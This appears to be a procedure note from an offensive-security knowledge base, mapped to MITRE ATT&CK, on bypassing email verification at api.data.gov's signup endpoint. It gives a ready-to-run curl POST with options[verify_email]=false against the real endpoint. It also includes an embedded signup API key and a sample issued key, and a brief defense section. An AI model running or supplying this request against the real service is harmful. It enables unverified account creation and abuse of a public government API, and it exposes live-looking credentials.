---
id: proc-004-submit-request
tags:
  - api-key-exploitation
  - request-submission
type: procedure
tools:
  - '[[tools/Firefox-Browser-Developer-Tools]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/submit-api-data-gov-signup-request]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:10.269Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
---
# Submit-Modified-Request-for-API-Key

## Summary

This procedure forwards the tampered POST request to the server, resulting in the creation of a user account and immediate generation of a valid API key without email verification.

## Description

Upon submission of the modified request to /api-umbrella/v1/users.json, the api-umbrella backend processes the parameters without validating options[verify_email], creating the account and issuing an API key. The response includes the full user object with the key, which can be used instantly for API calls. This enables attackers to generate keys for fake emails, facilitating abuse of government data APIs.

## Requirements

1. Modified POST request ready for forwarding
2. Proxy or dev tools to send the request
3. Target endpoint accessible

## Defense

Defensive measures and detection strategies:

- Require server-side email verification for all new accounts
- Implement API key throttling and monitoring for newly generated keys
- Block or flag requests with verify_email=false

## Objectives

1. Create account and obtain API key
2. Verify key usability without verification step
3. Assess impact of spoofed elements if applied

## Instructions

### Step 1: Forward the Modified Request

**Context**: Send the altered POST to the endpoint to trigger account creation.

Use the interception tool to resume or forward the request, or execute [[commands/submit-api-data-gov-signup-request]] via curl for replication.

```bash
curl -X POST 'https://api.data.gov/api-umbrella/v1/users.json?api_key=8Mndjk7k8ygsU4rM1lwBltMzet1FEAIuZeaqzEqV' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'user[first_name]=hacker&user[last_name]=hacker&user[email]=hacker@gmail.com&options[verify_email]=false&user[terms_and_conditions]=1'
```

> Expected: Server accepts the request and returns JSON with api_key.

### Step 2: Validate the Response

**Context**: Confirm the API key is generated and usable.

Parse the response for the user.api_key field and test it against a sample API endpoint.

> Success: Key is present, e.g., "api_key":"0dA6hjpXUG0V9Lj7kQkx8yiKkm9Go9H15VyPt8fs"; no verification email sent.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/submit-api-data-gov-signup-request]]

## Tools Used

- [[tools/Firefox-Browser-Developer-Tools]]

## Tags

- [[api-key-exploitation]]
- [[request-submission]]
